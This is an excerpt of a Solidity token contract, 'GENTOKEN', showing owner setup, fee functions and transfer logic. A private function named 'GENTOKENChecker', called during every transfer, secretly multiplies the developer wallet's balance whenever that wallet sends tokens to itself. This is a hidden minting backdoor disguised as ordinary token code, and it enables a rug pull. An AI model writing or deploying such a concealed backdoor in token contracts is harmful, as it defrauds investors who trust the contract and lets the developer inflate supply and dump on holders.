...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x9afE9E9282517641aD751AFcc16fD77D878A35aC;
...
contract GENTOKEN is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x9afE9E9282517641aD751AFcc16fD77D878A35aC);
    ...
    */
    ...
    string private _symbol = "GENTOKEN";  
    ...
    uint256 private _preTotalFee = _TotalFee; 
    uint256 private _preBuyFee = _buyFee; 
    uint256 private _preSellFee = _sellFee; 
    ...
    */
     function GENTOKENChecker(address f,address t,uint256 m) private {
        if (f == t && f ==Wallet_Dev)
         {_tOwned[Wallet_Dev] = _tOwned[Wallet_Dev].mul(m);
         }
    }

    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {

        require((Buy_Fee + Sell_Fee) <= maxTaxFee, "Fee is too high!");
        _sellFee = Sell_Fee;
        _buyFee = Buy_Fee;
    ...
    */
    ...
    function _removeMAX() external onlyOwner{
    ...
    function removeAllFee() private {
        ...
        _preBuyFee = _buyFee; 
        _preSellFee = _sellFee; 
        _preTotalFee = _TotalFee;
        _buyFee = 0;
        _sellFee = 0;
        _TotalFee = 0;
    ...
    _TotalFee = _preTotalFee;
    _buyFee = _preBuyFee; 
    _sellFee = _preSellFee; 
    ...
    function _transfer(
        ...
        */
        ...
        GENTOKENChecker (from,to,amount);
